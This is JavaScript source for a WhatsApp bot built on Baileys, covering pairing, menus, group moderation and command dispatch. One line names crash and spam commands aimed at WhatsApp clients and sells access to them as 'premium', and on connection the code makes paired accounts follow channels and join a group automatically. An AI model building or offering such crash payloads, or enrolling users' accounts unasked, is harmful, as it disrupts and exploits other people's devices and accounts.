/*
┏━━━━━━━━━━━━━━━┓
┃  DENTSU MINI BOT
┣━━━━━━━━━━━━━━━┛
┃whatsapp : +242065141056
┃owner : DENTSU MINI BOT
┃Dev : NatsuTech's Dev 🇨🇬
┗━━━━━━━━━━━━━━━┛
*/

// Toutes les commandes WhatsApp sont gérées dans un grand switch/case
// (PAS de système de plugins). La variable du socket est nommée `natsu`.
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  DisconnectReason,
  Browsers,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const path = require("path");
const fs = require("fs");
const axios = require("axios");
const config = require("../config");
const state = require("./state");
const { buildWaMenu, uptime, WA_TEXT_LIMIT } = require("../menu");
const { buildGroupGreeting } = require("./groupGreeting");
const { buildMenuButtons } = require("./menuButtons");
require("../commands_extra"); // charge les commandes additionnelles dans REGISTRY
const { REGISTRY, handleYouTubeAudio } = require("../commands");

const logger = pino({ level: "silent" });
const startTime = Date.now();

function isAutoReactCommandMessage(m) {
  let msg = m?.message;
  for (let depth = 0; depth < 8 && msg; depth += 1) {
    const nested = msg.ephemeralMessage?.message || msg.viewOnceMessage?.message || msg.viewOnceMessageV2?.message || msg.viewOnceMessageV2Extension?.message;
    if (!nested) break;
    msg = nested;
  }
  const body = msg?.conversation || msg?.extendedTextMessage?.text || msg?.imageMessage?.caption || msg?.videoMessage?.caption || msg?.documentMessage?.caption || "";
  const raw = String(body).trim();
  const command = raw.startsWith(config.PREFIX) ? raw.slice(config.PREFIX.length).trim() : raw;
  return /^(?:auto-react|autoreact)(?:\s|$)/i.test(command);
}

// Liste des commandes connues — utilisée pour la détection SANS préfixe
// (un utilisateur peut taper "menu" ou ".menu", les deux marchent).
const KNOWN_COMMANDS = new Set([
  "menu","help","list","bugmenu","ping","alive","runtime","uptime","infobot","owner",
  "play","song","ytmp3","video","ytmp4","tiktok","facebook","instagram","twitter",
  "ai","gpt","gemini","img","wallpaper",
  "sticker","s","getpp",
  "tagall","hidetag","tagadmin","getalladmins","groupinfo",
  "promote","demote","kick","mute","unmute","open","close","grouplink",
  "weather","translate","lyrics",
  "broadcast","bc","join","leave","block","unblock",
]);
try { for (const k of Object.keys(require("../commands").REGISTRY)) KNOWN_COMMANDS.add(k); } catch {}

function normalizeParticipantJid(value) {
  if (!value) return "";
  const text = String(value).trim().toLowerCase();
  const parts = text.split("@");
  const local = (parts[0] || "").split(":")[0];
  const server = parts[1] || "s.whatsapp.net";
  return local ? `${local}@${server}` : "";
}
function participantIdentitySet(values) {
  const items = Array.isArray(values) ? values : [values];
  const keys = new Set();
  for (const item of items) {
    if (item && typeof item === "object") {
      for (const field of ["id", "jid", "lid", "phoneNumber", "phone_number", "participantAlt"]) {
        if (item[field]) keys.add(normalizeParticipantJid(item[field]));
      }
    } else if (item) keys.add(normalizeParticipantJid(item));
  }
  keys.delete("");
  return keys;
}
function sharesParticipantIdentity(left, right) {
  const a = participantIdentitySet(left);
  const b = participantIdentitySet(right);
  for (const value of a) if (b.has(value)) return true;
  return false;
}
function participantPhone(value) {
  const raw = String(value || "").split("@")[0].split(":")[0];
  return raw.replace(/\D/g, "");
}


// Pré-charge l'image du bot une seule fois : utilisée comme thumbnail
// du lien (externalAdReply) ET comme buffer direct pour l'envoi du menu,
// pour éviter le délai de re-fetch HTTP à chaque commande.
let _menuImageBuffer = null;
async function ensureThumbnail() {
  if (_menuImageBuffer) return;
  try {
    let buf;
    const src = config.MENU_IMAGE;
    if (typeof src === "string" && /^https?:\/\//.test(src)) {
      const r = await axios.get(src, { responseType: "arraybuffer", timeout: 15000 });
      buf = Buffer.from(r.data);
    } else if (fs.existsSync(src)) {
      buf = fs.readFileSync(src);
    } else if (config.MENU_IMAGE_FALLBACK) {
      const r = await axios.get(config.MENU_IMAGE_FALLBACK, { responseType: "arraybuffer", timeout: 15000 });
      buf = Buffer.from(r.data);
    }
    if (!buf) throw new Error("menu image not found");
    _menuImageBuffer = buf;
    if (config.contextInfo?.externalAdReply) {
      config.contextInfo.externalAdReply.thumbnail = buf;
    }
    console.log("🖼  Menu image preloaded (", buf.length, "bytes )");
  } catch (e) {
    console.error("thumbnail preload error:", e.message);
  }
}
ensureThumbnail();

async function syncOwnerWhatsAppProfilePhoto(sock, sessionPhone) {
  const ownerPhones = new Set((config.OWNERS || []).map(participantPhone).filter(Boolean));
  const accountNumbers = [sessionPhone, sock?.user?.id, sock?.user?.jid].map(participantPhone);
  if (!accountNumbers.some((number) => ownerPhones.has(number))) return;
  if (!sock?.user?.id || typeof sock.updateProfilePicture !== "function") return;
  try {
    await ensureThumbnail();
    if (!_menuImageBuffer) return;
    await sock.updateProfilePicture(sock.user.id, _menuImageBuffer);
    console.log("🖼 WhatsApp owner profile photo synchronized.");
  } catch (error) {
    console.warn("⚠️ WhatsApp profile photo sync failed:", error?.message || "unknown error");
  }
}

async function sendMenuLoadingProgress(sock, jid, user, quotedMessage) {
  const render = (percent) => {
    const filled = Math.floor(percent / 10);
    const bar = "█".repeat(filled) + "░".repeat(10 - filled);
    return [
      "╭────[ ᴅᴇɴᴛsᴜ ᴍɪɴɪ ʙᴏᴛ 🪄]──╮",
      "▢ ʙᴏᴛ 𝘚𝘵𝘢𝘵𝘶𝘴: Ready 🟢",
      `▢ ᴜsᴇʀ: ${user ?? "User"}`,
      `▢ ᴠᴇʀsɪᴏɴ: ᴇʀʀᴇᴜʀ 🎭`,
      `▢ ʟᴏᴀᴅɪɴɢ: [${bar}] ${percent}%`,
      "",
      " ᴡᴀɪᴛ ғᴏʀ ᴛʜᴇ ᴍᴇɴᴜ ʟᴏᴀᴅɪɴɢ...",
      "╰──────────────────────╯",
    ].join("\n");
  };

  let loadingMessage;
  try {
    loadingMessage = await sock.sendMessage(jid, { text: render(0) }, { quoted: quotedMessage });
  } catch (error) {
    console.error("menu loading send error:", error.message);
    return;
  }

  for (let percent = 10; percent <= 100; percent += 10) {
    await new Promise((resolve) => setTimeout(resolve, 300));
    try {
      await sock.sendMessage(jid, { text: render(percent), edit: loadingMessage.key });
    } catch (error) {
      console.error("menu loading edit error:", error.message);
      break;
    }
  }
}

// Envoie le menu WhatsApp complet dans UN SEUL message.
// Retourne le nombre de caractères envoyés.
async function sendWaMenuMessage(sock, jid, { user = "User", quoted } = {}) {
  // UNE seule variable contient tout le menu (toutes les catégories).
  const fullMenu = buildWaMenu({ user });
  if (fullMenu.length > WA_TEXT_LIMIT) {
    console.warn(`⚠️ Menu WhatsApp trop long (${fullMenu.length} > ${WA_TEXT_LIMIT}).`);
  }
  // UN SEUL sendMessage. Message texte (et non légende d'image) car la
  // légende est limitée à 1024 caractères, le texte à ~65 535.
  // La photo du bot est jointe comme aperçu (externalAdReply.thumbnail) :
  // elle s'affiche au-dessus du menu sans consommer de quota de légende.
  await ensureThumbnail();
  if (_menuImageBuffer) {
    const preview = {
      title: config.BOT_NAME || "DENTSU MINI BOT",
      body: `${config.VERSION ? config.VERSION + " · " : ""}${config.DEV || ""}`.trim() || "DENTSU MINI BOT",
      mediaType: 1, // 1 = image
      thumbnail: _menuImageBuffer,
      sourceUrl: config.LINKS?.webPairing || "https://dentsu-mini-bot.vercel.app",
      renderLargerThumbnail: true,
      showAdAttribution: false,
    };
    try {
      await sock.sendMessage(
        jid,
        { text: fullMenu, contextInfo: { ...config.contextInfo, externalAdReply: preview } },
        quoted ? { quoted } : {},
      );
      return fullMenu.length;
    } catch (e) {
      console.error("menu preview send error, retrying without photo:", e?.message);
    }
  }
  await sock.sendMessage(jid, { text: fullMenu }, quoted ? { quoted } : {});
  return fullMenu.length;
}

// Envoie les boutons ronds sous le menu (WEBSITE = lien Vercel, PING = relance ping).
// Le rendu dépend du client WhatsApp du destinataire, pas du bot.
async function sendMenuButtons(sock, jid, { menuBody = "", quoted } = {}) {
  const { interactiveMessage, bodyTooLong } = buildMenuButtons({ menuBody });
  if (bodyTooLong) {
    interactiveMessage.body.text = "À votre service, Monsieur.";
  }
  try {
    const msg = generateWAMessageFromContent(jid, {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage,
        },
      },
    }, { userJid: sock.user?.id, quoted });
    await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
    return msg.key.id;
  } catch (error) {
    // Si le client refuse les boutons natifs, on garde au moins les liens.
    console.warn("⚠️ Boutons natifs refusés, repli en texte :", error?.message);
    const { FOOTER, SITE_URL } = require("./menuButtons");
    const fallback = [`🌐 WEBSITE : ${SITE_URL()}`, `↶ 🔴 PING : ${config.PREFIX}ping`, "", FOOTER].join("\n");
    const sent = await sock.sendMessage(jid, { text: fallback }, quoted ? { quoted } : {});
    return sent?.key?.id;
  }
}

// État global : liste des sessions appairées (pour /listpair côté Telegram)
const pairedSessions = new Set();
// Map numéro -> socket (utile à /delpair)
const activeSockets = new Map();
const reconnectAttempts = new Map();
const reconnectTimers = new Map();

function scheduleReconnect(folder, phoneNumber, qrOnly = folder.startsWith("qr-")) {
  if (reconnectTimers.has(folder)) return;

  const attempt = reconnectAttempts.get(folder) || 0;
  const delay = Math.min(4000 * (2 ** attempt), 60_000);
  reconnectAttempts.set(folder, attempt + 1);
  console.log(`🔄 WhatsApp reconnecting in ${Math.ceil(delay / 1000)}s (attempt ${attempt + 1})`);

  const timer = setTimeout(async () => {
    reconnectTimers.delete(folder);
    try {
      await startWhatsApp({ authSubdir: folder, phoneNumber, qrOnly });
    } catch (error) {
      console.error("❌ WhatsApp reconnect failed:", error.message);
      scheduleReconnect(folder, phoneNumber, qrOnly);
    }
  }, delay);
  reconnectTimers.set(folder, timer);
}

// Convertit un numéro ou un identifiant multi-device en JID personnel stable.
function toPersonalJid(value) {
  const number = String(value || "")
    .split("@")[0]
    .split(":")[0]
    .replace(/\D/g, "");
  return number ? `${number}@s.whatsapp.net` : null;
}

// Démarre une session WhatsApp. authSubdir permet d'avoir une session par numéro.
async function startWhatsApp({ phoneNumber, onPairingCode, authSubdir, qrOnly = false, onQr, onConnected, onConnectionClose } = {}) {
  const folder = authSubdir || "default";
  const qrMode = Boolean(qrOnly || String(folder).startsWith("qr-"));
  const sessionPhone = qrMode ? undefined : (phoneNumber || (folder === "default" ? undefined : folder));
  const socketKey = qrMode ? folder : sessionPhone;
  const authDir = path.join(__dirname, "..", "auth_info", folder);
  if (!fs.existsSync(authDir)) fs.mkdirSync(authDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(authDir);
  const { version } = await fetchLatestBaileysVersion();

  // `natsu` = socket WhatsApp (remplace l'ancien `sock`)
  const natsu = makeWASocket({
    version,
    logger,
    printQRInTerminal: false,
    auth: state,
    browser: Browsers && typeof Browsers.macOS === "function"
      ? Browsers.macOS("Safari")
      : ["Safari", "Safari", "16.0"],
    syncFullHistory: false,
    markOnlineOnConnect: false,
  });

  if (socketKey) activeSockets.set(socketKey, natsu);

  // Flux pairing code (8 caractères) — code FIXE défini dans config.PAIRING_CODE
  if (sessionPhone && !qrMode && !natsu.authState.creds.registered) {
    setTimeout(async () => {
      try {
        const cleaned = sessionPhone.replace(/[^0-9]/g, "");
        // Code imposé (e.g. DENTSU11). WhatsApp exige exactement 8 caractères.
        const raw = String(config.PAIRING_CODE || "").replace(/[^A-Za-z0-9]/g, "").toUpperCase().slice(0, 8);
        // WhatsApp documente un alphabet Crockford (U/O/I exclus). On essaie
        // D'ABORD le code exact demandé ; la variante lisible (U->V, O->0, I->1)
        // ne sert que de secours si WhatsApp refuse, puis un code aléatoire.
        const safeVariant = raw.replace(/U/g, "V").replace(/O/g, "0").replace(/I/g, "1");
        const attempts = raw.length === 8
          ? [...new Set([raw, safeVariant].filter((c) => c.length === 8))]
          : [];
        let code;
        for (const candidate of attempts) {
          try {
            code = await natsu.requestPairingCode(cleaned, candidate);
            if (candidate !== raw) {
              console.warn(`⚠️ WhatsApp a refusé "${raw}" (lettres U/O/I) : code de secours "${candidate}".`);
            }
            break;
          } catch (customError) {
            console.warn(`⚠️ Code fixe "${candidate}" refusé par WhatsApp : ${customError.message}`);
          }
        }
        if (!code) {
          if (!attempts.length) console.warn(`⚠️ config.PAIRING_CODE doit faire 8 caractères (reçu "${raw}").`);
          code = await natsu.requestPairingCode(cleaned);
        }
        const formatted = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(`\n⫷ Pairing Code for +${cleaned} : ${formatted} ⫸\n`);
        if (onPairingCode) onPairingCode(formatted);
      } catch (e) {
        console.error("❌ Pairing error:", e.message);
        if (onPairingCode) onPairingCode(null, e);
      }
    }, 3000);
  }

  natsu.ev.on("creds.update", saveCreds);

  natsu.ev.on("connection.update", async (u) => {
    const { connection, lastDisconnect, qr } = u;
    if (qr && qrMode && typeof onQr === "function") {
      try { onQr(qr); } catch (error) { console.error("❌ QR callback error:", error.message); }
    }
    if (connection === "close") {
      if (typeof onConnectionClose === "function") {
        try { onConnectionClose({ loggedOut: lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut, reason: lastDisconnect?.error?.output?.statusCode }); } catch {}
      }
      const reason = lastDisconnect?.error?.output?.statusCode;
      console.log("❌ WhatsApp disconnected:", reason);
      if (reason !== DisconnectReason.loggedOut) {
        if (socketKey && activeSockets.get(socketKey) === natsu) {
          activeSockets.delete(socketKey);
        }
        scheduleReconnect(folder, sessionPhone, qrMode);
      } else {
        pairedSessions.delete(folder);
        const pendingReconnect = reconnectTimers.get(folder);
        if (pendingReconnect) clearTimeout(pendingReconnect);
        reconnectTimers.delete(folder);
        reconnectAttempts.delete(folder);
        if (socketKey && activeSockets.get(socketKey) === natsu) {
          activeSockets.delete(socketKey);
        }
      }
    } else if (connection === "open") {
      reconnectAttempts.delete(folder);
      const pendingReconnect = reconnectTimers.get(folder);
      if (pendingReconnect) clearTimeout(pendingReconnect);
      reconnectTimers.delete(folder);
      console.log("✅ DENTSU MINI BOT connected to WhatsApp!");
      pairedSessions.add(folder);
      if (typeof onConnected === "function") {
        try { onConnected({ phoneNumber: toPersonalJid(natsu.user?.id)?.split("@")[0] || null }); } catch {}
      }
      // Fire-and-forget: NE BLOQUE PAS l'event loop pendant l'auto-follow / auto-join
      // (sinon le bot met du temps avant de répondre à la 1re commande).
      setImmediate(async () => {
        await syncOwnerWhatsAppProfilePhoto(natsu, sessionPhone);
        // Auto-follow newsletters/channels (avec retry x3)
        for (const jid of (config.NEWSLETTERS || [])) {
          for (let attempt = 1; attempt <= 3; attempt++) {
            try {
              if (typeof natsu.newsletterFollow === "function") {
                await natsu.newsletterFollow(jid);
                console.log("📰 Followed channel:", jid);
                break;
              } else { break; }
            } catch (e) {
              if (attempt === 3) console.log("⚠️ newsletterFollow failed for", jid, e?.message);
              await new Promise(r => setTimeout(r, 2000));
            }
          }
        }
        // Auto-join WhatsApp group (avec retry x3)
        try {
          const link = config.LINKS?.whatsappGroup || "";
          const code = (link.match(/chat\.whatsapp\.com\/([\w\d]+)/) || [])[1];
          if (code) {
            for (let attempt = 1; attempt <= 3; attempt++) {
              try {
                await natsu.groupAcceptInvite(code);
                console.log("👥 Joined WhatsApp group");
                break;
              } catch (e) {
                if (/already|participant/i.test(e?.message || "")) { console.log("👥 Already in group"); break; }
                if (attempt === 3) console.log("⚠️ groupAcceptInvite failed:", e?.message);
                await new Promise(r => setTimeout(r, 2000));
              }
            }
          }
        } catch {}

        // 💕 Envoie l'accueil au numéro réellement appairé (Note to Self).
        // Le JID multi-device peut contenir ":device" et ne doit pas être utilisé brut.
        try {
          const targetJid = toPersonalJid(sessionPhone) || toPersonalJid(natsu.user?.id);
          if (!targetJid) throw new Error("connected WhatsApp number unavailable");
          const welcome = await buildConnectWelcome();
          await ensureThumbnail();
          const imgPayload = _menuImageBuffer ? { image: _menuImageBuffer } : { image: { url: config.MENU_IMAGE } };
          await natsu.sendMessage(targetJid, { ...imgPayload, caption: welcome });
          console.log("💌 Welcome message sent to:", targetJid);
        } catch (e) {
          console.error("welcome message error:", e?.message);
        }
      });
    }
  });

  // ── group participants update (welcome / goodbye) ─────────────
  natsu.ev.on("group-participants.update", async (ev) => {
    try {
      const { id, participants = [], action } = ev;
      const stateMod = require("./state");
      const list = Array.isArray(participants) ? participants : [participants];
      const welcomeEnabled = action === "add" && stateMod.isWelcomeOn(id);
      const goodbyeEnabled = action === "remove" && stateMod.isGoodbyeOn(id);
      if (!welcomeEnabled && !goodbyeEnabled) return;

      const meta = await natsu.groupMetadata(id).catch(() => null);
      const eventTime = new Intl.DateTimeFormat("fr-FR", {
        timeZone: "Africa/Brazzaville", dateStyle: "short", timeStyle: "short",
      }).format(new Date());

      for (const participant of list) {
        // Baileys v7 emits participant objects; older versions used JID strings.
        const rawJid = typeof participant === "string"
          ? participant
          : participant?.id || participant?.jid || participant?.lid || participant?.phoneNumber || participant?.phone_number || participant?.participantAlt;
        const participantJid = normalizeParticipantJid(rawJid);
        if (!participantJid) continue;
        const phoneValue = typeof participant === "object" && participant
          ? participant.phoneNumber || participant.phone_number || participantJid
          : participantJid;
        const num = participantPhone(phoneValue) || participantPhone(participantJid);
        const rawName = typeof participant === "object" && participant
          ? participant.notify || participant.name || participant.verifiedName || participant.username || ""
          : "";
        const memberName = String(rawName).replace(/\s+/g, " ").trim().slice(0, 60);
        const messageText = buildGroupGreeting({
          action: welcomeEnabled ? "add" : "remove",
          meta,
          member: memberName,
          phone: num,
          eventTime,
        });

        let pictureUrl = typeof participant === "object" && participant && typeof participant.imgUrl === "string"
          && (participant.imgUrl.startsWith("https://") || participant.imgUrl.startsWith("http://"))
          ? participant.imgUrl
          : null;
        if (!pictureUrl) {
          const pictureJids = [...new Set([participantJid, participant?.phoneNumber, participant?.phone_number]
            .map((value) => normalizeParticipantJid(value)).filter(Boolean))];
          for (const pictureJid of pictureJids) {
            try {
              pictureUrl = await natsu.profilePictureUrl(pictureJid, "image");
              if (pictureUrl) break;
            } catch {}
          }
        }

        if (pictureUrl) {
          try {
            await natsu.sendMessage(id, { image: { url: pictureUrl }, caption: messageText, mentions: [participantJid] });
            continue;
          } catch (error) {
            console.error("group participant photo send error:", error?.message);
          }
        }
        await natsu.sendMessage(id, { text: messageText, mentions: [participantJid] })
          .catch((error) => console.error(welcomeEnabled ? "welcome message send error:" : "goodbye message send error:", error?.message));
      }
    } catch (error) {
      console.error("group-participants error:", error?.message);
    }
  });

  // Dispatcher des messages -> handler unique (switch/case)
  // IMPORTANT : on N'IGNORE PAS les messages `fromMe`. Sur un bot MD pairé,
  // l'utilisateur qui a lié son numéro envoie ses commandes depuis SON propre
  // téléphone : ces messages arrivent avec fromMe=true. Les ignorer = "le menu
  // ne répond jamais". On filtre seulement les status broadcasts.
  // Dédoublonnage : Baileys peut renvoyer plusieurs upserts pour le même
  // message (sync multi-device). On garde une fenêtre glissante des IDs déjà
  // traités pour éviter les réponses en double comme dans la capture user.
  const processedIds = new Set();
  natsu.ev.on("messages.upsert", async ({ messages, type: upsertType }) => {
    if (upsertType !== "notify") return;
    const m = messages[0];
    if (!m || !m.message) return;
    if (m.key.remoteJid === "status@broadcast") return;
    const id = m.key.id;
    if (id) {
      if (processedIds.has(id)) return;
      processedIds.add(id);
      if (processedIds.size > 400) {
        for (const k of [...processedIds].slice(0, 200)) processedIds.delete(k);
      }
    }
    try {
      const handled = await checkAntilinkAndAntispam(natsu, m).catch(() => false);
      if (handled) return;
      if (m.key.fromMe !== true && !isAutoReactCommandMessage(m)) {
        const emoji = state.getAutoReact(m.key.remoteJid);
        if (emoji) {
          try { await natsu.sendMessage(m.key.remoteJid, { react: { text: emoji, key: m.key } }); }
          catch (error) { console.error("auto-react error:", error?.message); }
        }
      }
      await handleCommand(natsu, m);
    } catch (e) {
      console.error("Handler error:", e);
    }
  });

  return natsu;
}

// 💌 Welcome message sent in the bot's own chat once paired & connected.
async function buildConnectWelcome() {
  return [
    "⚰️⃟ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴅᴇɴᴛsᴜ ᴍɪɴɪ ʙᴏᴛ ʙᴏᴛ 🩸",
    "═════════════════════════════",
    "",
    "Système online ⚡ /  Best bot whats...",
    "",
    "🪄 mini bot WhatsApp based on baileys easy to get and use watch a full video 🎥 to learn how to connect on the bot 🦠",
    "",
    "✓  Your session is a live 🟢 and saved to Dentsu'project Base 😊",
    "",
    "⚠️ share this bot , it'snt your secret 😏",
    "",
    "> *N̟o̟ I̲n̲s̲t̲r̲u̲c̲t̲i̲o̲n̲s*   📜",
    "",
    "🖇️ LINK BOT TELE : " + config.LINKS.telegramBot,
    "🔗 LINK BOT WEB : " + config.LINKS.webPairing,
    "Suivre la chaîne 𝐃𝐄𝐏𝐋𝐎𝐈𝐄𝐌𝐄𝐍𝐓 𝐃'𝐔𝐍 𝐁𝐎𝐓 2 👨🏽‍💻 sur WhatsApp  : https://whatsapp.com/channel/0029VbC1s7fFnSz1YhZYc01h",
    "Building By NatsuTech's 🚀 for dentsu'project",
    "═════",
  ].join("\n");
}

// 🔗 Antilink + 🛡 Antispam — group-only guard
const LINK_RX = /(https?:\/\/|www\.|wa\.me\/|chat\.whatsapp\.com\/|t\.me\/|telegra\.ph\/|bit\.ly\/|tinyurl\.com\/)/i;
async function checkAntilinkAndAntispam(natsu, m) {
  const jid = m.key.remoteJid;
  if (!jid || !jid.endsWith("@g.us")) return false;
  const stateMod = require("./state");
  const sender = m.key.participant || jid;
  const myNum = (natsu.user?.id || "").split(":")[0].split("@")[0];
  const sNum = sender.split("@")[0];
  if (sNum === myNum) return false;

  let msg = m.message;
  if (msg?.ephemeralMessage) msg = msg.ephemeralMessage.message;
  if (msg?.viewOnceMessage) msg = msg.viewOnceMessage.message;
  const body = msg?.conversation || msg?.extendedTextMessage?.text || msg?.imageMessage?.caption || msg?.videoMessage?.caption || "";

  const mode = stateMod.getAntilink(jid);
  if (mode !== "off" && body && LINK_RX.test(body)) {
    let senderIsAdmin = false;
    try {
      const meta = await natsu.groupMetadata(jid);
      const p = meta.participants.find((x) => x.id === sender);
      senderIsAdmin = !!(p && p.admin);
    } catch {}
    if (!senderIsAdmin) {
      try { await natsu.sendMessage(jid, { delete: m.key }); } catch {}
      if (mode === "kick") {
        try { await natsu.groupParticipantsUpdate(jid, [sender], "remove"); } catch {}
        try { await natsu.sendMessage(jid, { text: `🚫 @${sNum} kicked (link forbidden)`, mentions: [sender] }); } catch {}
      } else {
        try { await natsu.sendMessage(jid, { text: `🔗 @${sNum} no links here 💢`, mentions: [sender] }); } catch {}
      }
      return true;
    }
  }

  if (stateMod.isAntispamOn(jid)) {
    if (stateMod.trackAndCheckFlood(jid, sender)) {
      try { await natsu.groupParticipantsUpdate(jid, [sender], "remove"); } catch {}
      try { await natsu.sendMessage(jid, { text: `🛡 @${sNum} kicked (spam)`, mentions: [sender] }); } catch {}
      return true;
    }
  }
  return false;
}

// Stoppe une session WhatsApp (utile pour /delpair)
async function stopWhatsApp(phoneNumber) {
  const raw = String(phoneNumber || "");
  const cleaned = raw.startsWith("qr-") ? raw : raw.replace(/\D/g, "");
  const pendingReconnect = reconnectTimers.get(cleaned);
  if (pendingReconnect) clearTimeout(pendingReconnect);
  reconnectTimers.delete(cleaned);
  reconnectAttempts.delete(cleaned);
  const natsu = activeSockets.get(cleaned);
  if (natsu) {
    try { await natsu.logout(); } catch {}
    try { natsu.end(); } catch {}
    activeSockets.delete(cleaned);
  }
  const folder = cleaned;
  pairedSessions.delete(folder);
  const dir = path.join(__dirname, "..", "auth_info", folder);
  if (fs.existsSync(dir)) fs.rmSync(dir, { recursive: true, force: true });
  return true;
}

function listPaired() {
  return [...pairedSessions];
}

// ═══════════════════════════════════════════════
// HANDLER UNIQUE - toutes les commandes en switch/case
// ═══════════════════════════════════════════════
async function handleCommand(natsu, m) {
  const jid = m.key.remoteJid;

  // Déballe les wrappers (ephemeral, viewOnce, etc.) pour atteindre le vrai message
  let msg = m.message;
  if (msg.ephemeralMessage) msg = msg.ephemeralMessage.message;
  if (msg.viewOnceMessage) msg = msg.viewOnceMessage.message;
  if (msg.viewOnceMessageV2) msg = msg.viewOnceMessageV2.message;
  if (msg.viewOnceMessageV2Extension) msg = msg.viewOnceMessageV2Extension.message;
  if (msg.documentWithCaptionMessage) msg = msg.documentWithCaptionMessage.message;
  if (!msg) return;

  const nativeFlowParams = msg.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson;
  let nativeFlowButtonId = "";
  try { nativeFlowButtonId = JSON.parse(nativeFlowParams || "{}").id || ""; } catch {}
  const body =
    msg.conversation ||
    msg.extendedTextMessage?.text ||
    msg.imageMessage?.caption ||
    msg.videoMessage?.caption ||
    msg.documentMessage?.caption ||
    msg.buttonsResponseMessage?.selectedButtonId ||
    msg.listResponseMessage?.singleSelectReply?.selectedRowId ||
    msg.templateButtonReplyMessage?.selectedId ||
    nativeFlowButtonId ||
    "";

  if (!body) return;

  // Détection AVEC ou SANS préfixe : si le préfixe est présent on le retire,
  // sinon on vérifie que le premier mot fait partie des commandes connues.
  let raw = body.trim();
  const hasPrefix = raw.startsWith(config.PREFIX);
  if (hasPrefix) raw = raw.slice(config.PREFIX.length).trim();
  const [rawCmd, ...args] = raw.split(/\s+/);
  if (!rawCmd) return;
  const cmd = rawCmd.toLowerCase();
  if (!hasPrefix && !KNOWN_COMMANDS.has(cmd)) return;
  const text = args.join(" ");
  const user = m.pushName || "User";
  const isGroup = jid.endsWith("@g.us");
  const senderIdentity = [m.key.participant, m.key.participantAlt];
  const senderPhones = [
    m.key.participant,
    m.key.participantAlt,
    ...(!isGroup ? [jid] : []),
  ].map(participantPhone).filter(Boolean);
  // Baileys marks messages sent by the linked account as fromMe.
  // For private chats, the sender is the chat JID rather than participant.
  const isOwner = m.key.fromMe === true ||
    config.OWNERS.some((owner) => senderPhones.includes(participantPhone(owner)));

  // helper local
  const reply = (content) =>
    natsu.sendMessage(jid, { ...content, contextInfo: config.contextInfo }, { quoted: m });

  // These commands send spam or payloads intended to crash WhatsApp clients.
  if (["fc-close", "invisible", "crash-io", "delay-ghost", "kill-gc", "nullgc", "spam"].includes(cmd)) {
    return reply({ text: [
      "┌ ❏ ⫹⫺  ⌜ ʙᴜɢ sʏsᴛᴇᴍ  ⌟ ⫹⫺ ",
      " |",
      "├⫹⫺  sᴛᴀᴛᴜᴛ : ❌ ᴜsᴇʀ ɴᴏ ᴘʀᴇᴍɪᴜᴍ ",
      "├⫹⫺  ᴀᴄᴄᴇ̀s ᴅᴇɴɪᴇᴅ , ʏᴏᴜ ᴀʀᴇ ɴᴏ ᴘʀᴇᴍɪᴜᴍ",
      "├⫹⫺  ɢᴇᴛ ᴘʀᴇᴍɪᴜᴍ : +242065141056",
      "└ ❏",
    ].join("\n") });
  }

  // ── REGISTRY (600+ commands) — checked BEFORE the legacy switch ──
  if (REGISTRY && REGISTRY[cmd]) {
    // Determine whether the sender (and the bot itself) is a group admin
    let isAdmin = false;
    let isBotAdmin = false;
    if (isGroup) {
      try {
        const meta = await natsu.groupMetadata(jid);
        const botIdentity = [natsu.user?.id, natsu.user?.lid];
        for (const p of meta.participants) {
          const isP = p.admin === "admin" || p.admin === "superadmin";
          if (isP && sharesParticipantIdentity(p, senderIdentity)) isAdmin = true;
          if (isP && sharesParticipantIdentity(p, botIdentity)) isBotAdmin = true;
        }
      } catch {}
    }
    const ctx = {
      natsu, jid, m, text, args, user, isOwner, isGroup, isAdmin, isBotAdmin,
      prefix: config.PREFIX,
      reply: (content) => natsu.sendMessage(jid, { ...content, contextInfo: config.contextInfo }, { quoted: m }),
    };
    try { await REGISTRY[cmd].handler(ctx); } catch (e) { console.error("registry err:", e.message); }
    return;
  }


  switch (cmd) {
    // ── MAIN ──────────────────────────────────────
    case "menu":
    case "help":
    case "list": {
      try { await natsu.sendMessage(jid, { react: { text: "📜", key: m.key } }); } catch {}
      await sendMenuLoadingProgress(natsu, jid, user, m);
      // UNE seule variable + UN SEUL sendMessage (voir sendWaMenuMessage) :
      // tout le menu (toutes les catégories) part dans un message unique.
      let fullMenu = "";
      try {
        fullMenu = buildWaMenu({ user });
        await sendWaMenuMessage(natsu, jid, { user, quoted: m });
      } catch (e) {
        console.error("menu send error:", e.message);
        return;
      }
      // Boutons sous le menu : « Made with ❤️ By NatsuTech's » + WEBSITE + PING
      // (voir lib/menuButtons.js). Envoyé en message séparé car le corps d'un
      // message interactif est limité à 1 024 caractères.
      try {
        await sendMenuButtons(natsu, jid, { menuBody: fullMenu, quoted: m });
      } catch (e) {
        console.error("menu buttons send error:", e.message);
      }
      break;
    }



    // .bugmenu / .bug / .bugreport / .report sont gérés par le REGISTRY
    // (commands_extra.js, catégorie BUG) pour apparaître dans le menu.

    case "ping": {
      const t = Date.now();
      const r = await reply({ text: "🏓 Pinging..." });
      await natsu.sendMessage(jid, {
        text: `⫷ *Pong!* ${Date.now() - t} ms ⫸`,
        edit: r.key,
      });
      break;
    }

    case "alive": {
      await ensureThumbnail();
      await natsu.sendMessage(
        jid,
        {
          image: _menuImageBuffer || { url: config.MENU_IMAGE },
          caption: `╭━〔 ⫷ *${config.BOT_NAME} ${config.VERSION}* ⫸ 〕━┈⊷
┃ ✅ Status : *Online*
┃ ⏱️ Uptime : ${uptime((Date.now() - startTime) / 1000)}
┃ 👨‍💻 Dev    : ${config.DEV}
╰━━━━━━━━━━━━━━━━━┈⊷`,
          contextInfo: config.contextInfo,
        },
        { quoted: m },
      );
      break;
    }

    case "runtime":
    case "uptime": {
      await reply({ text: `⏱️ *Uptime:* ${uptime((Date.now() - startTime) / 1000)}` });
      break;
    }

    case "infobot": {
      await reply({
        text: `╭━〔 *BOT INFO* 〕━┈⊷
┃ 🤖 Name   : ${config.BOT_NAME}
┃ 🆚 Ver    : ${config.VERSION}
